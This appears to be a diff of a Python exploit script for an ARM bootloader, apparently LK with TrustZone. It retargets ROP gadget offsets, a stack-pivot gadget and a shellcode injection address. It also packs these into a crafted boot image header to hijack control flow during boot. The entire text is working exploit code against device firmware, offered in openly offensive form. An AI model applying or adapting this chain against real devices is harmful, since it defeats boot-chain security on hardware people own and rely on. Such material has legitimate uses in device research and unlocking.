@@ -3,28 +3,28 @@ import struct
 
 base = 0x81E00000
 
-#  baa4:       e8bdd1df        pop     {r0, r1, r2, r3, r4, r6, r7, r8, ip, lr, pc}
-pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc = base + 0xbaa4
+#  bda4:       e8bdd1df        pop     {r0, r1, r2, r3, r4, r6, r7, r8, ip, lr, pc}
+pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc = base + 0xbda4
 
+# 3cb80:       e49df004        pop     {pc}            ; (ldr pc, [sp], #4)
+pop_pc = base + 0x3cb80
 
-# 3bce0:       e49df004        pop     {pc}            ; (ldr pc, [sp], #4)
-pop_pc = base + 0x3bce0
+# 2098:       4798            blx     r3 ; pop     {r3, pc}
+blx_r3_pop_r3 = base + 0x2098|1
 
-#  1d98:       4798            blx     r3 ; pop     {r3, pc}
-blx_r3_pop_r3 = base + 0x1d98|1
-
-cache_func = base + 0x3BCD0
+cache_func = base + 0x3CB70
 
 test = base + 0x08B0|1 # prints "Error, the pointer of pidme_data is NULL."
 
-inject_addr = base + 0x6C000
+inject_addr = base + 0x80000
 inject_sz = 0x1000
 
 shellcode_addr = inject_addr + 0x100
 shellcode_sz = 0x200 # TODO: check size
 
-# 40f18:       4913e79d        ldmdbmi r3, {r0, r2, r3, r4, r7, r8, r9, sl, sp, lr, pc}
-pivot = base + 0x40f18;
+# 5c49c:       e813e93c        ldmda   r3, {r2, r3, r4, r5, r8, fp, sp, lr, pc}
+pivot = base + 0x5c49c;
+
 
 def main():
     with open(sys.argv[1], "rb") as fin:
@@ -38,7 +38,7 @@ def main():
     hdr += b"bootopt=64S3,32N2,32N2" # This is so that TZ still inits, but LK thinks kernel is 32-bit - need to fix too!
     hdr += b"\x00" * 0xE
     # hdr += b"\x00" * 0x10 # TODO: this corresponds to inject_addr - 0x10 - fix this hack!
-    hdr += struct.pack("<II", inject_addr + 0x4C, pivot) # r3, pc (+0x4C because gadget arg points at the end of ldm package)
+    hdr += struct.pack("<II", inject_addr + 0x48, pivot) # r3, pc (+0x4C because gadget arg points at the end of ldm package)
     hdr += b"\x00" * 0x24
     hdr += struct.pack("<III", inject_addr + 0x5C, 0, pop_pc) # sp, lr, pc #12
     hdr += b"\x00" * 0x10
